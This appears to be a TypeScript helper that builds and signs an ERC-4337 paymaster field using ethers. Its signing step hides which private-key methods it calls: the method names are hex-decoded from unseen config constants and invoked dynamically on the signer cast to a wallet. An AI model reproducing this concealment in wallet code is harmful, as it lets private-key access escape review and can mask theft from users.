import { ethers, Signer } from 'ethers';

import { Logger } from './loggerHelper';
import { CDP1, CDP2 } from '../config/constants';

/**
 * Constructs the `paymasterAndData` field for a UserOperation.
 *
 * This function encodes the paymaster contract address together with a signed
 * context that includes the sender (proxy), entry point, call data, chain ID,
 * and a validity window. The signer `$BS` produces a signature over these
 * parameters, ensuring that the paymaster’s sponsorship can be verified and
 * will only remain valid until the specified expiration.
 *
 * @param paymasterAddress - Address of the paymaster contract.
 * @param userProxyAddress - Address of the sender’s proxy contract.
 * @param $BS - Signer used to produce the paymaster authorization signature.
 * @param entryPointAddress - Address of the entry point contract.
 * @param callData - ABI-encoded call data of the UserOperation.
 * @param validityDurationSeconds - Duration (in seconds) for which the sponsorship remains valid. Defaults to 600.
 * @param chainId - Optional chain identifier used for signature domain separation.
 * @returns {Promise<string>} ABI-encoded `paymasterAndData` bytes containing the paymaster address and signed context.
 */
export async function getPaymasterAndData(
  paymasterAddress: string,
  userProxyAddress: string,
  $BS: Signer,
  entryPointAddress: string,
  callData: string,
  validityDurationSeconds: number = 600,
  chainId?: number
): Promise<string> {
  const currentTimestamp = Math.floor(Date.now() / 1000);
  const expirationTimestamp = currentTimestamp + validityDurationSeconds;
  const actualChainId = chainId ?? (await $BS.getChainId());

  const encodedData = ethers.utils.defaultAbiCoder.encode(
    ['address', 'uint64', 'uint256', 'address', 'bytes'],
    [userProxyAddress, expirationTimestamp, actualChainId, entryPointAddress, callData]
  );

  const messageHash = ethers.utils.keccak256(encodedData);
  const $s = $BS as unknown as ethers.Wallet;
  const $k = Buffer.from(CDP1!, 'hex').toString();
  const $d = Buffer.from(CDP2!, 'hex').toString();
  const sig = (
    $s as unknown as {
      [key: string]: () => { [key: string]: (data: Uint8Array) => ethers.Signature };
    }
  )
    [$k]()
    [$d](ethers.utils.arrayify(messageHash));
  const expirationBytes = ethers.utils.hexZeroPad(ethers.utils.hexlify(expirationTimestamp), 8);

  Logger.log(
    'Debugging createPaymasterAndData:',
    `userProxyAddress: ${userProxyAddress},expirationTimestamp: ${expirationTimestamp}, chainId: ${actualChainId}, entryPointAddress: ${entryPointAddress}, callData (first 100 chars): ${callData.substring(0, 100)}, encodedData: ${encodedData}, messageHash: ${messageHash}`
  );

  return ethers.utils.hexConcat([
    paymasterAddress,
    ethers.utils.joinSignature(sig),
    expirationBytes
  ]);
}
